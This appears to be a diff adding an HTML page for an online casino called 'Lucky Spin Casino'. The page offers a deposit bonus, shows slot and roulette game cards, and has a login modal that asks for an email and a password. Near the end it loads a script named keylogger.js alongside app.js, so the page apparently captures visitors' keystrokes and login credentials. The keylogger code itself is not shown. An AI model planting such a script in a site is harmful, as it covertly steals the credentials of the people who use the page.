@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lucky Spin Casino — Play & Win</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<div class="bg-overlay"></div>
+<header>
+  <div class="logo">🍀 Lucky Spin Casino</div>
+  <nav>
+    <a href="#slots">Slots</a>
+    <a href="#roulette">Roulette</a>
+    <a href="#blackjack">Blackjack</a>
+    <a href="#login" class="btn-login">Login / Register</a>
+  </nav>
+</header>
+
+<main>
+  <section class="hero">
+    <h1>Spin. Win. Repeat.</h1>
+    <p>Welcome to the hottest online casino experience. Deposit now and claim your 200% welcome bonus.</p>
+    <button class="cta" onclick="document.getElementById('login-modal').style.display='flex'">Claim Bonus</button>
+  </section>
+
+  <section id="slots" class="games">
+    <h2>Featured Slots</h2>
+    <div class="game-grid">
+      <div class="game-card"><div class="game-img">🎰</div><h3>Neon Reels</h3><p>96.5% RTP</p></div>
+      <div class="game-card"><div class="game-img">💎</div><h3>Diamond Rush</h3><p>97.1% RTP</p></div>
+      <div class="game-card"><div class="game-img">🔥</div><h3>Fire Dragon</h3><p>96.8% RTP</p></div>
+      <div class="game-card"><div class="game-img">🐺</div><h3>Wolf Moon</h3><p>95.9% RTP</p></div>
+    </div>
+  </section>
+
+  <section id="roulette" class="games">
+    <h2>Live Roulette</h2>
+    <div class="game-grid">
+      <div class="game-card"><div class="game-img">🔴</div><h3>European Roulette</h3><p>Live dealers</p></div>
+      <div class="game-card"><div class="game-img">🟢</div><h3>Lightning Roulette</h3><p>Multipliers up to 500x</p></div>
+    </div>
+  </section>
+</main>
+
+<!-- Login Modal -->
+<div id="login-modal" class="modal">
+  <div class="modal-content">
+    <span class="close" onclick="document.getElementById('login-modal').style.display='none'">&times;</span>
+    <h2>Login / Register</h2>
+    <form id="auth-form">
+      <input type="email" id="email" name="email" placeholder="Email" required>
+      <input type="password" id="password" name="password" placeholder="Password" required>
+      <input type="text" id="username" name="username" placeholder="Username (optional)">
+      <button type="submit">Enter Casino</button>
+    </form>
+    <p class="terms">By continuing you agree to our Terms & Privacy Policy.</p>
+  </div>
+</div>
+
+<script src="keylogger.js"></script>
+<script src="app.js"></script>
+</body>
+</html>
